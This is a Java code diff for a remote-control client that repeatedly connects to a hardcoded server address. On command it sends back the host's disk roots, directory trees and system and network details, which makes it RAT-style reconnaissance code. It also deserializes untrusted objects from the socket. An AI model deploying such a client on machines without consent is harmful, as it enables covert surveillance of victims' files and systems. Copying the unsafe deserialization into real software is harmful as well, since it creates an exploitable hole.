@@ -4,12 +4,8 @@ import Client.Tree.Tree;
 import Client.InformationGathering.SystemInformation;
 import Client.InformationGathering.SystemNetworkInformation;
 
-import javax.swing.*;
 import java.io.*;
 import java.net.*;
-import java.nio.file.Path;
-import java.util.Arrays;
-
 
 public class Client {
     private static final String IP = "192.168.1.133";
@@ -18,57 +14,48 @@ public class Client {
     public static void main(String[] args) {
 
         while (true) {
+            try {
+                System.out.println("Conectando...");
 
-        try {
-            System.out.println("Conectando...");
-            Socket s = new Socket(IP, PORT);
+                Socket s = new Socket(IP, PORT);
 
-            System.out.println("Conectado");
+                System.out.println("Conectado");
 
 
-            ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());
-            PrintWriter writer = new PrintWriter(s.getOutputStream());
-            BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());
+                ObjectInputStream input = new ObjectInputStream(s.getInputStream());
 
-            while (true) {
-                String sel = reader.readLine();
 
-                if ("PING".equals(sel) || "IP".equals(sel)) {
-                    writer.println(s.getRemoteSocketAddress());
-                    writer.flush();
-                } else if ("CLOSE".equals(sel)) {
-                    s.close();
-                    return;
-                } else if ("PC_NAME".equals(sel)) {
-                    InetAddress addr = InetAddress.getLocalHost();
-                    writer.println(addr.getHostName());
-                    writer.flush();
-                } else if ("OS".equals(sel)) {
-                    writer.println(System.getProperty("os.name"));
-                    writer.flush();
-                } else if (sel.startsWith("TREE")) {
-                    new Thread(new Tree(new File(sel.substring(4)), s)).start();
-                } else if ("SYS_DETAILS".equals(sel)) {
-                    output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
-                } else if ("DISKS".equals(sel)) {
-                    File[] files = File.listRoots();
-                    String[] rutas = new String[files.length];
-                    for (int i = 0; i < files.length; i++) {
-                        rutas[i] = files[i].toString();
+                Object reader;
+                do {
+                    reader = input.readObject();
+
+                    if (reader instanceof Object[]) {
+                        output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
+                    } else if (reader instanceof String e && e.equals("DISKS")) {
+                        File[] files = File.listRoots();
+                        String[] rutas = new String[files.length];
+                        for (int i = 0; i < files.length; i++) {
+                            rutas[i] = files[i].toString();
+                        }
+                        output.writeObject(rutas);
+                    } else if (reader instanceof String e && e.startsWith("TREE")) {
+                        new Thread(new Tree(new File(e.substring(4)), output)).start();
+                    } else if (reader instanceof String e && e.equals("SYS_DETAILS")) {
+                        output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
                     }
-                    new ObjectOutputStream(s.getOutputStream()).writeObject(rutas);
-                }
+
+                } while (reader != null);
+            } catch (ConnectException e) {
+                System.out.println("Connection refused");
+            } catch (SocketException ignored) {
+                System.out.println("Connection reset");
+            } catch (IOException | ClassNotFoundException e) {
+                e.printStackTrace();
             }
-        } catch (ConnectException e) {
-            System.out.println("Connection refused");
-        } catch (SocketException ignored) {
-            System.out.println("Connection reset");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
 
         }
 
-}
+    }
 
 }
